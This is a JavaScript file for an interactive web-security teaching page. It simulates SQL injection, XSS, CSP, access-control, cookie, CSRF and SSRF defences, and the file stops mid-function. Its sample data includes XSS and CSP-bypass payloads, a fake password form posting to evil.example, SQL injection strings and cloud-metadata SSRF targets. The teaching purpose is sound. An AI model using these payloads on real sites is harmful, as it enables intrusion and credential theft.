/* app.js - the live demos for "Web Application Security Essentials".
   Every demo is a simulation in this page: a toy SQL parser, sandboxed frames where no script can run,
   a mock API, a made-up DNS table and invented headers. Nothing is fetched and nothing you type is sent anywhere. */
(function () {
  "use strict";

  // --------------------------------------------------------------------------- helpers
  const $ = (id) => document.getElementById(id);
  const esc = (s) => String(s).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
  const sp = (cls, s) => `<span class="${cls}">${esc(s)}</span>`;
  const click = (id, fn) => $(id).addEventListener("click", fn);
  function store(key, val) {
    try { if (val === undefined) return localStorage.getItem(key); localStorage.setItem(key, val); } catch (e) {}
    return null;
  }
  const segPick = (id, attr, fn) => {
    const box = $(id);
    box.addEventListener("click", (e) => {
      const b = e.target.closest("button[" + attr + "]"); if (!b) return;
      for (const x of box.querySelectorAll("button")) x.setAttribute("aria-pressed", String(x === b));
      fn(b.getAttribute(attr));
    });
  };
  const presets = (id, attr, fn) => $(id).addEventListener("click", (e) => { const b = e.target.closest("button[" + attr + "]"); if (b) fn(b.getAttribute(attr)); });
  const verdict = (id, cls, text) => { const el = $(id); el.className = "verdict " + cls; el.textContent = text; };

  // --------------------------------------------------------------------------- title: one input, three places
  function hero() {
    const el = $("hero-in"), v = el.value;
    el.style.width = Math.min(30, Math.max(6, v.length + 1)) + "ch";
    $("hero-out").innerHTML =
      `${sp("k", "html:")} ${esc("<p>" + esc(v) + "</p>")}<br>` +
      `${sp("k", "sql: ")} ${esc("WHERE name = ?")}  ${sp("m", "params:")} ${esc(JSON.stringify([v]))}<br>` +
      `${sp("k", "url: ")} ${esc("/search?q=" + encodeURIComponent(v))}`;
    const t = v.trim().toLowerCase();
    let note;
    if (/drop\s+table\s+students/.test(t)) note = "# Little Bobby Tables (xkcd 327) stays a name here: a bound value can't end the statement.";
    else if (/<\s*script/.test(t)) note = "# a script tag, shown as text: the browser receives &lt;script&gt;, not a tag.";
    else if (/' *or *'1' *= *'1/.test(t)) note = "# the classic. As a bound value it's just an unusual name that matches nobody.";
    else if (t === "admin") note = "# a name, not a role. Typing admin grants nothing; the server decides who's an admin (part 2).";
    else if (t.includes("../")) note = "# path traversal: the same bug with the file system as the interpreter. Map IDs to files instead.";
    else if (/<\s*marquee/.test(t)) note = "# <marquee> still scrolls in browsers today. Not here: here it's text.";
    else if (v === "") note = "# nothing in, nothing out. Empty input is valid input: handle it on purpose.";
    else if (/o'brien/.test(t)) note = "# a real surname. Code that blocks apostrophes turns real people away; these methods just keep it as data.";
    else if (/['"<>&]/.test(v)) note = "# quotes, brackets and ampersands all stay data: each place has its own safe method.";
    else note = "# one input, three places, three safe methods. Try a quote or an angle bracket.";
    $("hero-note").textContent = note;
  }

  // --------------------------------------------------------------------------- SQL injection: a toy parser
  // A tiny tokenizer and WHERE-clause evaluator, enough to show how concatenated input changes a query's shape.
  const INVOICES = [
    { id: 1041, owner_id: 7, customer: "Northwind", amount: 1200 },
    { id: 1042, owner_id: 8, customer: "Northwind", amount: 9800 },
    { id: 1043, owner_id: 7, customer: "O'Brien", amount: 85.5 },
    { id: 1044, owner_id: 8, customer: "Harbor Labs", amount: 3150 },
    { id: 1045, owner_id: 9, customer: "Juniper & Co", amount: 612.75 },
    { id: 1046, owner_id: 7, customer: "Bluebird Cafe", amount: 240 },
  ];
  const OWNERS = { 7: "alice", 8: "bob", 9: "carol" };
  const SQL_HEAD = "SELECT id, owner_id, customer, amount FROM invoices WHERE owner_id = 7 AND customer = ";
  const COLS = ["id", "owner_id", "customer", "amount"];
  let sqMode = "concat";

  function sqlTokens(s) {
    const out = []; let i = 0, comment = "";
    while (i < s.length) {
      const c = s[i];
      if (/\s/.test(c)) { i++; continue; }
      if (c === "-" && s[i + 1] === "-") { comment = s.slice(i); break; }
      if (c === "'") {
        let j = i + 1, v = "";
        for (;;) {
          if (j >= s.length) throw new Error("unterminated string starting at: " + s.slice(i, i + 24));
          if (s[j] === "'") { if (s[j + 1] === "'") { v += "'"; j += 2; continue; } break; }
          v += s[j++];
        }
        out.push({ t: "str", v }); i = j + 1; continue;
      }
      if (/\d/.test(c)) { const m = /^\d+(\.\d+)?/.exec(s.slice(i)); out.push({ t: "num", v: Number(m[0]) }); i += m[0].length; continue; }
      if (/[A-Za-z_]/.test(c)) { const m = /^[A-Za-z_][A-Za-z_0-9]*/.exec(s.slice(i)); out.push({ t: "id", v: m[0].toLowerCase() }); i += m[0].length; continue; }
      const two = s.slice(i, i + 2);
      if (["<=", ">=", "<>", "!="].includes(two)) { out.push({ t: "op", v: two }); i += 2; continue; }
      if ("=<>".includes(c)) { out.push({ t: "op", v: c }); i++; continue; }
      if ("(),;*".includes(c)) { out.push({ t: c }); i++; continue; }
      throw new Error("unexpected character " + JSON.stringify(c));
    }
    return { tokens: out, comment };
  }
  function sqlRun(sql) {
    const { tokens, comment } = sqlTokens(sql);
    const stmts = [[]];
    for (const tk of tokens) { if (tk.t === ";") stmts.push([]); else stmts[stmts.length - 1].push(tk); }
    const first = stmts[0];
    const w = first.findIndex((tk) => tk.t === "id" && tk.v === "where");
    let p = w + 1;
    const peek = () => first[p], next = () => first[p++];
    const isKw = (k) => peek() && peek().t === "id" && peek().v === k;
    function primary() {
      const tk = next();
      if (!tk) throw new Error("query ends too early");
      if (tk.t === "(") { const e = expr(); if (!peek() || peek().t !== ")") throw new Error("missing )"); next(); return e; }
      if (tk.t === "str" || tk.t === "num") return () => tk.v;
      if (tk.t === "id") {
        if (!COLS.includes(tk.v)) throw new Error(`unknown column '${tk.v}'`);
        return (row) => row[tk.v];
      }
      throw new Error("syntax error near " + (tk.v !== undefined ? JSON.stringify(tk.v) : tk.t));
    }
    function cmp() {
      const a = primary();
      if (peek() && peek().t === "op") {
        const op = next().v, b = primary();
        return (row) => {
          let x = a(row), y = b(row);
          if (typeof x === "number" || typeof y === "number") { x = Number(x); y = Number(y); }
          switch (op) { case "=": return x === y; case "<>": case "!=": return x !== y; case "<": return x < y; case ">": return x > y; case "<=": return x <= y; default: return x >= y; }
        };
      }
      return (row) => { const v = a(row); return typeof v === "number" ? v !== 0 : Number(v) !== 0 && !isNaN(Number(v)); };
    }
    function not() { if (isKw("not")) { next(); const e = not(); return (row) => !e(row); } return cmp(); }
    function and() { let e = not(); while (isKw("and")) { next(); const l = e, r = not(); e = (row) => l(row) && r(row); } return e; }
    function expr() { let e = and(); while (isKw("or")) { next(); const l = e, r = and(); e = (row) => l(row) || r(row); } return e; }
    const where = expr();
    if (p < first.length) {
      const tk = first[p];
      if (tk.t === "id" && tk.v === "union") return { union: true, comment };
      throw new Error("syntax error near " + (tk.v !== undefined ? JSON.stringify(tk.v) : tk.t));
    }
    const extra = stmts.slice(1).filter((s) => s.length).map((s) => s.map((tk) => tk.t === "str" ? `'${tk.v}'` : tk.v !== undefined ? tk.v : tk.t).join(" "));
    return { rows: INVOICES.filter(where), comment, extra };
  }
  function sq() {
    const v = $("sq-in").value;
    const fmt = (n) => n.toLocaleString("en-US", { minimumFractionDigits: 2 });
    let res, sqlHtml;
    if (sqMode === "concat") {
      $("sq-code").innerHTML = esc('q = ("SELECT id, owner_id, customer, amount FROM invoices "\n     "WHERE owner_id = " + str(user.id) +\n     " AND customer = \'" + search + "\'")\ndb.execute(q)');
      sqlHtml = esc(SQL_HEAD + "'") + sp("inj", v) + esc("'");
      try { res = sqlRun(SQL_HEAD + "'" + v + "'"); } catch (e) { res = { error: e.message }; }
    } else {
      $("sq-code").innerHTML = esc('q = ("SELECT id, owner_id, customer, amount FROM invoices "\n     "WHERE owner_id = ? AND customer = ?")\ndb.execute(q, [user.id, search])');
      sqlHtml = esc(SQL_HEAD + "?") + "\n" + sp("m", "params: ") + esc(JSON.stringify([7, v]));
      res = { rows: INVOICES.filter((r) => r.owner_id === 7 && r.customer === v), extra: [] };
    }
    $("sq-sql").innerHTML = sqlHtml;
    const t = $("sq-rows");
    let note = "";
    if (res.error) {
      t.innerHTML = "";
      verdict("sq-verdict", "y", "Database error: " + res.error);
      note = v.includes("'") && !/or|--|;/i.test(v) ? "# an ordinary name broke the query. Injection bugs are ordinary bugs first: real data breaks them." : "# the input changed the query's shape enough to break it. Error messages like this tell an attacker they're in.";
    } else if (res.union) {
      t.innerHTML = "";
      verdict("sq-verdict", "bad", "UNION: on a real database this appends rows from any other table.");
      note = "# this toy doesn't run UNION. A real database would, with your app's permissions.";
    } else {
      const leaked = res.rows.filter((r) => r.owner_id !== 7);
      t.innerHTML = res.rows.length
        ? "<thead><tr><th>id</th><th>owner</th><th>customer</th><th>amount</th></tr></thead><tbody>" + res.rows.map((r) => `<tr${r.owner_id !== 7 ? ' class="leak"' : ""}><td>${r.id}</td><td>${esc(OWNERS[r.owner_id])}</td><td>${esc(r.customer)}</td><td>${fmt(r.amount)}</td></tr>`).join("") + "</tbody>"
        : '<tbody><tr><td class="m">(no rows)</td></tr></tbody>';
      if (leaked.length) verdict("sq-verdict", "bad", `${res.rows.length} rows, ${leaked.length} of them other people's invoices. The input became code.`);
      else if (sqMode === "param") verdict("sq-verdict", "ok", `The query's shape never changed. ${res.rows.length} matching row${res.rows.length === 1 ? "" : "s"}.`);
      else verdict("sq-verdict", "ok", res.rows.length ? `${res.rows.length} row${res.rows.length === 1 ? "" : "s"}, all Alice's.` : "No rows.");
      if (res.extra && res.extra.length) note = `# and a second statement: ${res.extra.join("; ")}. Whether a driver runs it depends on its settings (many refuse several statements per call). The toy doesn't run it.`;
      else if (res.comment) note = `# everything after -- is a comment, so the database ignored: ${res.comment}`;
      else if (sqMode === "param" && /'|--|;/.test(v) && !res.rows.length) note = "# just a strange customer name that matches nobody. That's all injection attempts become.";
    }
    if (/robert'\);\s*drop\s+table\s+students/i.test(v)) note = "# xkcd 327's Bobby Tables. The comic's moral was \"sanitize your database inputs\"; today's answer is \"use parameters\".";
    $("sq-note").textContent = note;
  }

  // --------------------------------------------------------------------------- XSS: raw vs escaped, in sandboxed frames
  const XS = {
    plain: ["Great talk, thanks!", "https://example.com"],
    bold: ["This is <b>really</b> useful", "https://example.com"],
    img: ["Nice! <img src=\"x\" onerror=\"alert('hi')\">", "https://example.com"],
    script: ["<script>alert('hi')</" + "script>Thanks!", "https://example.com"],
    jsurl: ["Check out my site!", "javascript:alert('hi')"],
    form: ["<form action=\"https://evil.example/login\"><p>Session expired. Please sign in again:</p><input type=\"password\" placeholder=\"Password\"> <button>Sign in</button></form>", "https://example.com"],
  };
  const FRAME_HEAD = "<!doctype html><meta charset=utf-8><base href=\"about:blank\"><style>body{margin:0;padding:10px 12px;font:14px/1.5 system-ui,sans-serif;color:#e8fdff;background:#07060f}a{color:#00f0ff;pointer-events:none}input,button{font:inherit}p{margin:.3em 0}.w{color:#9a9dd0;font-size:12px}</style>";
  function xsFindings(html) {
    const doc = new DOMParser().parseFromString("<body>" + html + "</body>", "text/html");
    const out = [];
    doc.querySelectorAll("script").forEach(() => out.push("a script tag would run"));
    doc.querySelectorAll("*").forEach((el) => { for (const a of el.attributes) if (/^on/i.test(a.name)) out.push(`an ${a.name} handler on <${el.tagName.toLowerCase()}> would run`); });
    doc.querySelectorAll("a[href]").forEach((a) => { if (/^javascript:/i.test(a.getAttribute("href").replace(/[\s\x00-\x1f]/g, ""))) out.push("a javascript: link would run when clicked"); });
    doc.querySelectorAll("form[action]").forEach((f) => out.push(`a form would send whatever is typed to ${f.getAttribute("action")} (no script needed)`));
    doc.querySelectorAll("iframe,object,embed").forEach((el) => out.push(`an <${el.tagName.toLowerCase()}> would load another page`));
    return out;
  }
  function xs() {
    const c = $("xs-in").value, u = $("xs-url").value.trim();
    const rawBody = `<div>${c}</div><p class="w">Website: <a href="${u}">${u}</a></p>`;
    const okUrl = /^https?:\/\//i.test(u);
    const safeBody = `<div>${esc(c)}</div><p class="w">Website: ${okUrl ? `<a href="${esc(u)}">${esc(u)}</a>` : "(link removed: only http and https are allowed)"}</p>`;
    $("xs-raw").srcdoc = FRAME_HEAD + rawBody;
    $("xs-safe").srcdoc = FRAME_HEAD + safeBody;
    const raw = xsFindings(rawBody), safe = xsFindings(safeBody);
    $("xs-findings").innerHTML = (raw.length ? raw.map((f) => `<li class="bad"><b>✗</b> Raw: ${esc(f)}</li>`).join("") : '<li class="ok"><b>✓</b> Raw: nothing would run this time (it&#39;s still a bug waiting for the wrong comment)</li>') +
      (safe.length ? safe.map((f) => `<li class="bad"><b>✗</b> Escaped: ${esc(f)}</li>`).join("") : '<li class="ok"><b>✓</b> Escaped: everything is shown as text; nothing runs</li>');
    let note = "# both frames are sandboxed, so nothing here actually runs: the list says what would on a real page.";
    if (/<\s*marquee/i.test(c)) note = "# <marquee> still scrolls in browsers today. It's HTML, not script, so even the sandbox lets it move. Escaping stops it too.";
    else if (/^javascript:/i.test(u)) note = "# HTML-escaping leaves javascript: untouched: there's nothing in it to escape. Links need a scheme check.";
    else if (/<form/i.test(c)) note = "# no script at all, yet a convincing fake form. Encoding stops it; a script policy (next slide) doesn't.";
    $("xs-note").textContent = note;
  }

  // --------------------------------------------------------------------------- CSP: which policy stops which injection
  const CSP = {
    none: "(no Content-Security-Policy header)",
    inline: "Content-Security-Policy:\n  script-src 'self' 'unsafe-inline' https://cdn.example",
    list: "Content-Security-Policy:\n  script-src 'self' https://cdn.example",
    strict: "Content-Security-Policy:\n  script-src 'nonce-R4nd0m' 'strict-dynamic';\n  object-src 'none'; base-uri 'none'",
  };
  // [injected markup, {policy: [stopped?, why]}]
  const CSP_ROWS = [
    ["<script>steal()</script>", { none: [0, "nothing stops it"], inline: [0, "'unsafe-inline' allows it"], list: [1, "inline script isn't allowed"], strict: [1, "it has no nonce"] }],
    ["<img src=x onerror=steal()>", { none: [0, "nothing stops it"], inline: [0, "'unsafe-inline' allows handlers"], list: [1, "inline handlers need 'unsafe-inline'"], strict: [1, "inline handlers aren't allowed"] }],
    ['<script src="https://evil.example/x.js">', { none: [0, "nothing stops it"], inline: [1, "host isn't on the list"], list: [1, "host isn't on the list"], strict: [1, "it has no nonce"] }],
    ['<script src="https://cdn.example/api?callback=steal">', { none: [0, "nothing stops it"], inline: [0, "the host is allowed, and its endpoint runs any callback"], list: [0, "the host is allowed, and its endpoint runs any callback"], strict: [1, "no nonce; 'strict-dynamic' ignores host lists"] }],
    ['<base href="https://evil.example/">', { none: [0, "your relative script URLs now load from evil.example"], inline: [1, "the redirected scripts aren't on the list"], list: [1, "the redirected scripts aren't on the list"], strict: [1, "base-uri 'none' ignores it (without it, your nonced scripts would load from evil.example)"] }],
    ['<form action="https://evil.example">…', { none: [0, "works: no script needed"], inline: [0, "works: no script needed"], list: [0, "works: no script needed"], strict: [0, "works: no script needed (form-action would help)"] }],
  ];
  function cs(p) {
    $("cs-policy").textContent = CSP[p];
    let stopped = 0;
    $("cs-rows").innerHTML = CSP_ROWS.map(([code, m]) => {
      const [ok, why] = m[p]; if (ok) stopped++;
      return `<tr class="${ok ? "ok" : "bad"}"><th scope="row"><code>${esc(code)}</code></th><td><b>${ok ? "Blocked" : "Gets through"}</b> ${esc(why)}</td></tr>`;
    }).join("");
    $("cs-note").textContent = p === "strict" ? `# stops ${stopped} of 6. The last one is why encoding stays the fix: CSP is the net, not the floor.` : `# stops ${stopped} of 6.`;
  }

  // --------------------------------------------------------------------------- access control: a mock API
  const USERS = { 1: { id: 1, name: "Dana", role: "admin" }, 7: { id: 7, name: "Alice", role: "user" }, 8: { id: 8, name: "Bob", role: "user" }, 9: { id: 9, name: "Carol", role: "user" } };
  const AC_ROUTES = {
    invoice: { method: "GET", url: "/api/invoices/1041", body: null },
    profile: { method: "PATCH", url: "/api/users/7", body: '{ "name": "Alice", "role": "admin" }' },
    admin: { method: "GET", url: "/api/admin/users", body: null },
  };
  let acRoute = "invoice";
  function acSet(r) {
    acRoute = r; const R = AC_ROUTES[r];
    $("ac-method").textContent = R.method; $("ac-url").value = R.url;
    $("ac-body").hidden = !R.body; if (R.body) $("ac-body").textContent = "body: " + R.body;
    $("ac-prev").disabled = $("ac-next").disabled = r === "admin";
    acSend();
  }
  function acStep(d) { const el = $("ac-url"); el.value = el.value.replace(/(\d+)(?!.*\d)/, (m) => String(Math.max(0, Number(m) + d))); acSend(); }
  function acSend() {
    const url = $("ac-url").value.trim(), check = $("ac-check").checked, hide = $("ac-hide").checked;
    const out = (code, obj) => { $("ac-out").textContent = `HTTP/1.1 ${code}\n` + JSON.stringify(obj, null, 2); };
    let note = "", m;
    if (acRoute === "invoice") {
      m = /^\/api\/invoices\/(.*)$/.exec(url);
      if (!m) { out("404 Not Found", { error: "no such route" }); verdict("ac-verdict", "y", "No such route."); $("ac-note").textContent = ""; return; }
      const raw = decodeURIComponent(m[1]);
      if (!/^\d+$/.test(raw)) {
        out("400 Bad Request", { error: "invoice id must be a number" });
        verdict("ac-verdict", "ok", "Rejected: not a number.");
        $("ac-note").textContent = /or/i.test(raw) ? "# that's the SQL trick from part 1. Here the ID is parsed as a number first, so it's just a 400." : "# IDs are parsed as numbers before anything else happens.";
        return;
      }
      const id = Number(raw), inv = INVOICES.find((x) => x.id === id);
      if (!inv) {
        out("404 Not Found", { error: "not found" }); verdict("ac-verdict", "y", "No invoice with that number.");
        $("ac-note").textContent = id === 404 ? "# invoice 404: not found, fittingly." : ""; return;
      }
      const mine = inv.owner_id === 7;
      if (!mine && check) { out("404 Not Found", { error: "not found" }); verdict("ac-verdict", "ok", "Blocked: not Alice's, so as far as she can tell it doesn't exist."); note = "# the query now includes owner_id = current user. 404 rather than 403 avoids confirming the invoice exists."; }
      else {
        out("200 OK", { id: inv.id, owner: OWNERS[inv.owner_id], customer: inv.customer, amount: inv.amount });
        if (mine) { verdict("ac-verdict", "ok", "Alice's own invoice."); note = "# fine. Now press \"id + 1\"."; }
        else { verdict("ac-verdict", "bad", `Leaked ${USERS[inv.owner_id].name}'s invoice: the server only checked that someone was signed in.`); note = hide ? "# the UI hides other people's invoices, but the API is what answers. Hiding a link isn't a check." : "# and with the UI no longer hiding them, anyone can find this by scrolling. Same bug, less effort."; }
      }
    } else if (acRoute === "profile") {
      m = /^\/api\/users\/(\d+)$/.exec(url);
      const u = m && USERS[Number(m[1])];
      if (!u) { out("404 Not Found", { error: "not found" }); verdict("ac-verdict", "y", "No such user."); $("ac-note").textContent = ""; return; }
      if (check && u.id !== 7) { out("404 Not Found", { error: "not found" }); verdict("ac-verdict", "ok", "Blocked: Alice can only update her own profile."); $("ac-note").textContent = ""; return; }
      const updated = check ? { ...u, name: "Alice" } : { ...u, name: "Alice", role: "admin" };
      out("200 OK", updated);
      if (check) { verdict("ac-verdict", "ok", "Only the name changed: role isn't a field users may set."); note = "# fields are allow-listed on the server: { name } in, everything else ignored."; }
      else if (u.id !== 7) { verdict("ac-verdict", "bad", `Alice just renamed ${u.name} and made them an admin.`); note = "# two bugs at once: no ownership check, and every field copied."; }
      else { verdict("ac-verdict", "bad", "Mass assignment: the server copied every field, so Alice made herself an admin."); note = "# the form never shows a role field. The request can still send one."; }
    } else {
      if (check) { out("403 Forbidden", { error: "admins only" }); verdict("ac-verdict", "ok", "Blocked: Alice isn't an admin."); note = ""; }
      else { out("200 OK", Object.values(USERS)); verdict("ac-verdict", "bad", "Any signed-in user can call the admin API."); note = "# the admin page link is hidden for Alice. The endpoint behind it isn't protected."; }
    }
    $("ac-note").textContent = note;
  }

  // --------------------------------------------------------------------------- cookie builder
  function ck() {
    const name = $("ck-name").value.trim(), ss = $("ck-ss").value, dom = $("ck-dom").value;
    const http = $("ck-http").checked, sec = $("ck-sec").checked, path = $("ck-path").checked;
    $("ck-line").textContent = `Set-Cookie: ${name}=3f9a1c0e7b2d${path ? "; Path=/" : ""}${dom ? "; Domain=" + dom : ""}${http ? "; HttpOnly" : ""}${sec ? "; Secure" : ""}${ss ? "; SameSite=" + ss : ""}`;
    const items = [], rej = [];
    if (!name || /[\s;,=()<>@:\\"\/\[\]?{}]/.test(name)) rej.push("Not a valid cookie name.");
    if (name.startsWith("__Host-") && (!sec || dom || !path)) rej.push("__Host- cookies must be Secure, have no Domain, and have Path=/.");
    if (name.startsWith("__Secure-") && !sec) rej.push("__Secure- cookies must be Secure.");
    if (ss === "None" && !sec) rej.push("SameSite=None must also be Secure.");
    let note = "";
    if (rej.length) {
      $("ck-list").innerHTML = rej.map((r) => `<li class="bad"><b>✗</b> Rejected: ${esc(r)}</li>`).join("") + '<li class="bad"><b>✗</b> The browser won\'t store this cookie at all.</li>';
    } else {
      items.push(http ? ["ok", "HttpOnly: scripts, including injected ones, can't read it."] : ["bad", "No HttpOnly: any script in the page can read it from document.cookie."]);
      items.push(sec ? ["ok", "Secure: only sent over HTTPS."] : ["bad", "No Secure: also sent over plain http://, readable on the network."]);
      if (ss === "Strict") items.push(["ok", "SameSite=Strict: only sent with same-site requests, even links from other sites arrive without it."]);
      else if (ss === "Lax") items.push(["ok", "SameSite=Lax: not sent on cross-site POSTs or embedded requests; sent when following a link here."]);
      else if (ss === "None") items.push(["y", "SameSite=None: sent with cross-site requests too, so you need CSRF defences."]);
      else items.push(["y", "SameSite not set: Chrome and Edge treat it as Lax, Firefox doesn't. Set it yourself."]);
      items.push(dom ? ["y", `Domain=${dom}: also sent to every subdomain of ${dom}.`] : ["ok", "No Domain: host-only, not shared with subdomains."]);
      if (!path) items.push(["y", "No Path=/: it only covers part of the site. (Path isn't a security boundary either way.)"]);
      if (name.startsWith("__Host-")) items.push(["ok", "__Host-: the browser guarantees it was set by this exact host, over HTTPS, for the whole site."]);
      $("ck-list").innerHTML = items.map(([c, t]) => `<li class="${c}"><b>${c === "ok" ? "✓" : c === "bad" ? "✗" : "!"}</b> ${esc(t)}</li>`).join("");
      if (name.startsWith("__Host-") && http && sec && (ss === "Lax" || ss === "Strict")) note = "# a perfect session cookie: host-locked, HTTPS only, out of scripts' reach, and same-site. Bake at 443.";
    }
    if (/^monster$/i.test(name)) note = "# me want cookie. Me also want HttpOnly.";
    $("ck-note").textContent = note;
  }

  // --------------------------------------------------------------------------- CSRF
  function cf() {
    const from = $("cf-from").value, ss = $("cf-ss").value;
    const token = $("cf-token").checked, origin = $("cf-origin").checked, postOnly = $("cf-postonly").checked;
    const cross = from !== "sub", get = from === "get";
    let sent, why;
    if (ss === "Strict") { sent = !cross; why = cross ? "Strict: never sent on a request another site started." : "Strict, but forum.bank.example is the same site (same registrable domain), so it's sent."; }
    else if (ss === "Lax" || ss === "unset-c") {
      sent = !cross || get;
      why = !cross ? "same site (sibling subdomain), so Lax sends it." : get ? "Lax still sends cookies when a link navigates the whole page." : "Lax: not sent on a cross-site POST.";
      if (ss === "unset-c") why += cross && !get ? " (Chrome makes one exception: a top-level POST within two minutes of the cookie being set.)" : "";
    } else { sent = true; why = ss === "None" ? "SameSite=None: sent with every request." : "Firefox applies no Lax default, so the cookie is sent."; }
    const steps = [];
    steps.push(["m", from === "post" ? "evil.example's page submits a hidden form to bank.example/transfer." : from === "get" ? "A link on evil.example takes you to bank.example/transfer?to=…" : "A form on forum.bank.example submits to bank.example/transfer."]);
    steps.push([sent ? "bad" : "ok", (sent ? "Your session cookie is attached: " : "No session cookie: ") + why]);
    let done = false, result;
    if (get && postOnly) result = ["ok", "405: /transfer only accepts POST. A link can't change anything."];
    else if (!sent) result = ["ok", "401: the bank sees an anonymous request. Nothing happens."];
    else if (token) result = ["ok", "403: no valid CSRF token. The other page can't read yours, so it can't send one."];
    else if (origin) result = ["ok", `403: Sec-Fetch-Site is "${cross ? "cross-site" : "same-site"}", not "same-origin".`];
    else { done = true; result = ["bad", get ? "200: a GET that changes state. Even Lax lets this through." : "200: transfer done, with your cookie, on someone else's request."]; }
    steps.push(result);
    $("cf-steps").innerHTML = steps.map(([c, t]) => `<li class="${c}">${esc(t)}</li>`).join("");
    verdict("cf-verdict", done ? "bad" : "ok", done ? "Money moved." : "Blocked.");
    if (token && origin && postOnly && (ss === "Lax" || ss === "Strict")) $("cf-verdict").textContent = "Blocked. Belt, braces and a second belt: nothing gets through from anywhere.";
  }

  // --------------------------------------------------------------------------- SSRF: naive vs robust URL checks
  // A made-up DNS table. Documentation ranges (198.51.100.0/24, 203.0.113.0/24) stand in for public internet addresses.
  const DNS = { "images.example.net": ["198.51.100.7"], "internal.example.com": ["10.0.0.5"], "short.example": ["203.0.113.20"], "localhost": ["127.0.0.1"] };
  const REDIRECT = { "short.example": "http://10.0.0.5/admin" };
  // rebind.example: the attacker's DNS answers a public address first, then 127.0.0.1 to any later lookup.
  const lookup = (h, again) => h === "rebind.example" ? [again ? "127.0.0.1" : "203.0.113.5"] : DNS[h];
  const v4 = (s) => { const m = /^(\d+)\.(\d+)\.(\d+)\.(\d+)$/.exec(s); return m ? m.slice(1).map(Number) : null; };
  function v4Bad(o) {
    const [a, b] = o;
    if (a === 0) return "this-network"; if (a === 10) return "private (10/8)"; if (a === 127) return "loopback";
    if (a === 169 && b === 254) return "link-local, home of the cloud metadata service"; if (a === 172 && b >= 16 && b <= 31) return "private (172.16/12)";
    if (a === 192 && b === 168) return "private (192.168/16)"; if (a === 100 && b >= 64 && b <= 127) return "carrier-grade NAT";
    if (a >= 224) return "multicast or reserved"; return "";
  }
  function ipBad(ip) {
    const o = v4(ip); if (o) return v4Bad(o);
    const h = ip.replace(/^\[|\]$/g, "").toLowerCase();
    if (h === "::1") return "loopback"; if (h === "::") return "unspecified";
    const mapped = /^::ffff:([0-9a-f]{1,4}):([0-9a-f]{1,4})$/.exec(h);
    if (mapped) { const x = parseInt(mapped[1], 16), y = parseInt(mapped[2], 16); return v4Bad([x >> 8, x & 255, y >> 8, y & 255]) || ""; }
    if (/^f[cd]/.test(h)) return "unique local"; if (/^fe[89ab]/.test(h)) return "link-local";
    return "";
  }
  function sf() {
    const raw = $("sf-in").value.trim();
    const li = (c, t) => `<li class="${c}">${esc(t)}</li>`;
    let u = null; try { u = new URL(raw); } catch (e) {}
    // naive
    const N = [];
    if (raw.includes("localhost") || raw.includes("169.254.169.254") || raw.includes("127.0.0.1")) N.push(li("ok", "The text contains a blocked word: refused."));
    else {
      N.push(li("m", "No blocked words in the text: allowed."));
      if (!u) N.push(li("m", "The library can't parse it either: nothing fetched."));
      else if (u.protocol === "file:") N.push(li("bad", "The library supports file:, so it reads " + u.pathname + " from the server's own disk."));
      else if (!/^https?:$/.test(u.protocol)) N.push(li("bad", `The library speaks ${u.protocol} too, and connects wherever it points.`));
      else {
        const host = u.hostname, ips = v4(host) || host.startsWith("[") ? [host] : lookup(host, true);
        if (!ips) N.push(li("m", `${host} doesn't resolve (in this toy).`));
        else {
          N.push(li("m", host === "rebind.example" ? "The library looks rebind.example up when it connects; the attacker's DNS now answers 127.0.0.1." : `The library parses the host as ${host}${ips[0] !== host ? " → " + ips[0] : ""}.`));
          if (ipBad(ips[0])) N.push(li("bad", `Fetched from ${ips[0]} (${ipBad(ips[0])}): an internal address.`));
          else if (REDIRECT[host]) N.push(li("bad", `Got a redirect to ${REDIRECT[host]} and followed it: an internal address.`));
          else N.push(li("ok", `Fetched from ${ips[0]}, a public address.`));
        }
      }
    }
    $("sf-naive").innerHTML = N.join("");
    // robust
    const R = [];
    if (!u) R.push(li("ok", "Not a valid URL: refused."));
    else if (!/^https?:$/.test(u.protocol)) R.push(li("ok", `Scheme ${u.protocol} isn't http or https: refused.`));
    else {
      const host = u.hostname;
      R.push(li("m", `Parsed host: ${host}${u.username ? ` (the "${decodeURIComponent(u.username)}" before the @ is just a username)` : ""}.`));
      const literal = v4(host) || host.startsWith("[");
      const ips = literal ? [host] : lookup(host);
      if (!ips) R.push(li("m", `${host} doesn't resolve (in this toy): refused.`));
      else {
        if (!literal) R.push(li("m", `Resolved ${host} → ${ips.join(", ")}.`));
        const bad = ips.map(ipBad).find(Boolean);
        if (bad) R.push(li("ok", `${ips[0]} is ${bad}: refused.`));
        else {
          R.push(li("m", `${ips[0]} is public. Connect to that same IP${host === "rebind.example" ? ", not a fresh lookup (a second lookup now answers 127.0.0.1)" : ""}.`));
          if (REDIRECT[host]) R.push(li("ok", `Response: redirect to ${REDIRECT[host]}. Not followed (re-checking it would refuse 10.0.0.5).`));
          else R.push(li("ok", "Fetched."));
        }
      }
    }
    $("sf-robust").innerHTML = R.join("");
    let note = "";
    if (/^gopher:/i.test(raw)) note = "# gopher:// (from 1991) is an old SSRF favourite: libraries that speak it can send raw bytes to internal services. http(s) only.";
    else if (u && u.hostname === "127.0.0.1" && !raw.includes("127.0.0.1")) note = `# URL parsers normalise ${u.host === "127.0.0.1" ? raw.replace(/^[a-z]+:\/\//i, "").split("/")[0] : "it"} to 127.0.0.1. String checks never see it coming.`;
    else if (raw.includes("169.254.169.254")) note = "# the address cloud servers ask for their own credentials. Every SSRF defence starts by keeping requests away from it.";
    $("sf-note").textContent = note;
  }

  // --------------------------------------------------------------------------- dependency version ranges
  const VERSIONS = [
    { v: "1.4.2", when: "8 months ago", note: "in your lock file" },
    { v: "1.4.3", when: "2 months ago", note: "bug fix" },
    { v: "1.5.0", when: "3 weeks ago", note: "new feature" },
    { v: "1.6.0", when: "2 hours ago", note: "malicious: published from a stolen account", bad: true },
  ];
  const LATEST = "1.6.0", LOCKED = "1.4.2";
  let svHow = "fresh";
  const pv = (s) => s.split(".").map(Number);
  const cmpV = (a, b) => { const x = pv(a), y = pv(b); for (let i = 0; i < 3; i++) if (x[i] !== y[i]) return x[i] - y[i]; return 0; };
  function comparators(range) {
    const r = range.trim();
    if (r === "" || r === "*" || r === "x" || r === "latest") return [];
    return r.split(/\s+/).map((c) => {
      const m = /^(\^|~|>=|<=|>|<|=)?v?(\d+|x|\*)(?:\.(\d+|x|\*))?(?:\.(\d+|x|\*))?$/.exec(c);
      if (!m) throw new Error("bad");
